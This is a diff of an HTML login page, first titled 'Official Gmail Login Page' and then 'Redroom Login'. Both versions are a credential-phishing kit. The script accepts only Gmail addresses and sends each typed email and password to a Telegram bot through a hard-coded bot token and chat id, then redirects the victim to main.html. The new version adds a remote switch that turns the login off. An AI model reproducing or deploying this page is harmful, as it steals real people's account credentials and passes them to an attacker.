@@ -3,111 +3,91 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Official Gmail Login Page</title>
+<title>Redroom Login</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body {
-  font-family: 'Roboto', sans-serif;
-  background: linear-gradient(135deg, #74ebd5, #ACB6E5);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
+*{box-sizing:border-box;margin:0;padding:0;}
+body{
+  font-family:'Roboto',sans-serif;
+  background:linear-gradient(135deg,#74ebd5,#ACB6E5);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
 }
-.login-container {
-  background: white;
-  padding: 50px 30px;
-  border-radius: 15px;
-  width: 100%;
-  max-width: 400px;
-  box-shadow: 0 15px 40px rgba(0,0,0,0.2);
-  text-align: center;
+.login-container{
+  background:white;
+  padding:50px 30px;
+  border-radius:15px;
+  width:100%;
+  max-width:400px;
+  box-shadow:0 15px 40px rgba(0,0,0,0.2);
+  text-align:center;
 }
-h2 { color: #333; margin-bottom: 30px; font-weight: 700; }
-input {
-  width: 100%;
-  padding: 15px;
-  margin: 12px 0;
-  border-radius: 8px;
-  border: 1px solid #ccc;
-  font-size: 16px;
+h2{color:#333;margin-bottom:30px;font-weight:700;}
+input{width:100%;padding:15px;margin:12px 0;border-radius:8px;border:1px solid #ccc;font-size:16px;}
+input:focus{border-color:#007bff;outline:none;}
+button.login-btn{
+  padding:15px;width:100%;
+  border:none;border-radius:10px;
+  background:linear-gradient(90deg,#667eea,#764ba2);
+  color:white;font-size:18px;cursor:pointer;margin-top:20px;font-weight:500;
 }
-input:focus { border-color: #007bff; outline: none; }
-button.login-btn {
-  padding: 15px;
-  width: 100%;
-  border: none;
-  border-radius: 10px;
-  background: linear-gradient(90deg, #667eea, #764ba2);
-  color: white;
-  font-size: 18px;
-  cursor: pointer;
-  margin-top: 20px;
-  font-weight: 500;
-}
-button.login-btn:hover { background: linear-gradient(90deg, #764ba2, #667eea); }
-a.telegram-btn {
-  display: inline-block;
-  margin-top: 20px;
-  padding: 12px 20px;
-  border-radius: 8px;
-  background-color: #26A5E4;
-  color: white;
-  font-weight: 500;
-  text-decoration: none;
-}
-a.telegram-btn:hover { background-color: #1D8BC1; }
+button.login-btn:hover{background:linear-gradient(90deg,#764ba2,#667eea);}
 </style>
 </head>
-
 <body>
 <div class="login-container">
-<h2>Login with Gmail</h2>
+<h2>Login with Email</h2>
 <input type="email" id="email" placeholder="Email">
 <input type="password" id="password" placeholder="Password">
 <button class="login-btn" onclick="sendLogin()">Login</button>
-
-<a class="telegram-btn" href="https://t.me/toxic_3234" target="_blank">Telegram Contact</a>
 </div>
 
 <script>
-const botToken = "8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
-const chatId = "7920005988";
+const botToken="8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
+const chatId="7920005988";
 
-function sendLogin() {
+// Auto redirect if login page disabled
+async function checkLoginEnabled(){
+  try{
+    const res = await fetch("loginstatus.json"); // JSON file from server
+    const data = await res.json();
+    if(data.loginEnabled===false){
+      localStorage.setItem('loggedIn','true'); // bypass login
+      window.location.href="main.html";
+    }
+  }catch(e){
+    console.log("Could not fetch login status:", e);
+  }
+}
+
+// Run check on load
+checkLoginEnabled();
+
+function sendLogin(){
   const email = document.getElementById('email').value.trim();
   const password = document.getElementById('password').value.trim();
-
-  if(!email || !password){
-    alert('সব তথ্য পূরণ করুন!');
-    return;
-  }
-
-  if(!email.endsWith("@gmail.com")){
-    alert('দয়া করে শুধুমাত্র Gmail ব্যবহার করুন!');
-    return;
-  }
-
-  const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
-
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message })
-  })
-  .then(res => res.json())
-  .then(data => {
-    if(data.ok){
-      alert('Login Successful! Redirecting to main page...');
-      // Redirect to main.html
-      window.location.href = "main.html";
-    } else {
-      alert('Problem sending data.');
-    }
-  })
-  .catch(err => alert('Error: ' + err));
+  if(!email||!password){alert('Please complete your login'); return;}
+  if(!email.endsWith("@gmail.com")){alert('Please use Gmail'); return;}
+  const message=`Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+  
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:chatId,text:message})
+  }).then(res=>res.json())
+    .then(data=>{
+      if(data.ok){
+        localStorage.setItem('loggedIn','true'); // save session
+        window.location.href="main.html"; // auto redirect
+      }else{alert('Problem sending data.');}
+    })
+    .catch(err=>alert('Error: '+err));
 }
+
+// Optional: Periodically check loginstatus.json for /loginoff command
+setInterval(checkLoginEnabled,5000);
 </script>
 </body>
 </html>
